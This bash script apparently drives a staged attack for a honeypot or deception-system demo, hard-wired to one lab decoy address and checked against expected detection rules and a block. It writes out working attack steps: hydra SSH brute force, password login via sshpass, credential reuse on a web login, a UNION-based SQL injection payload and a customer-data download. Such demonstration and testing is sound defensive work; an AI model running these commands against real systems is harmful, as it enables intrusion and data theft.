#!/usr/bin/env bash
# Owner: M4. P3 "targeted human" run for the demo. Runs on Laptop A (Kali) only.
# Needs: hydra, sshpass, curl.  Usage: bash scenarios/attack_p3.sh 192.168.77.20
set -euo pipefail

TARGET="${1:-}"
if [ "$#" -ne 1 ] || [ "$TARGET" != "192.168.77.20" ]; then
  echo "Refusing: this script only targets the lab decoy 192.168.77.20" >&2
  exit 1
fi
SSH_PORT=2222
WEB="http://${TARGET}:8080"
for tool in hydra sshpass curl; do command -v "$tool" >/dev/null; done
run_dir=$(mktemp -d /tmp/dg_p3.XXXXXX)
trap 'rm -rf "$run_dir"' EXIT
curl_lab() { curl --noproxy '*' --connect-timeout 3 --max-time 10 "$@"; }
pause() { echo; echo ">>> $1"; sleep "${STEP_DELAY:-4}"; }

pause "1. SSH brute force (6 wrong passwords, then the right one). Expect R01."
printf 'admin\n123456\npassword\nqwerty\nletmein\nwelcome1\nDemoPass-2026\n' > "$run_dir/words.txt"
hydra -l dg_demo -P "$run_dir/words.txt" -s "$SSH_PORT" -t 1 -W 1 "ssh://${TARGET}"

pause "2. Log in and look around. Expect R02, R03."
sshpass -p 'DemoPass-2026' ssh -p "$SSH_PORT" -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
  -o ConnectTimeout=5 dg_demo@"$TARGET" 'whoami; ls -la; cat notes.txt'

pause "3. Reuse the portal password from notes.txt on the web login. Expect strong-candidate link."
curl_lab -sS -o /dev/null -w "login %{http_code}\n" -c "$run_dir/cookies" -X POST "$WEB/login" \
  -d 'username=svc_portal&password=DGLAB-Portal-4471'

pause "4. SQL injection on search. Expect R07 (sqli)."
curl_lab -sS -o /dev/null -w "search %{http_code}\n" -b "$run_dir/cookies" --get "$WEB/search" \
  --data-urlencode "q=x' UNION SELECT username,password FROM users--"

pause "5. Download the customer export. Expect R04."
echo 'On the SOC, confirm the cross-decoy link with a reason before downloading (expect score 95). Press Enter.'
read -r
curl_lab -sS -o "$run_dir/customer_data.csv" -w "download %{http_code}\n" -b "$run_dir/cookies" "$WEB/download?file=customer_data.csv"

echo
echo ">>> Now on the dashboard: preview and apply the web-only block. Press Enter after blocking."
read -r
status=$(curl_lab -sS -o /dev/null -w '%{http_code}' "$WEB/")
echo "after block $status (expect 403)"
[ "$status" = 403 ] || exit 1
echo 'Undo the block on the SOC, then press Enter.'
read -r
status=$(curl_lab -sS -o /dev/null -w '%{http_code}' "$WEB/")
echo "after undo $status (expect 200)"
[ "$status" = 200 ]
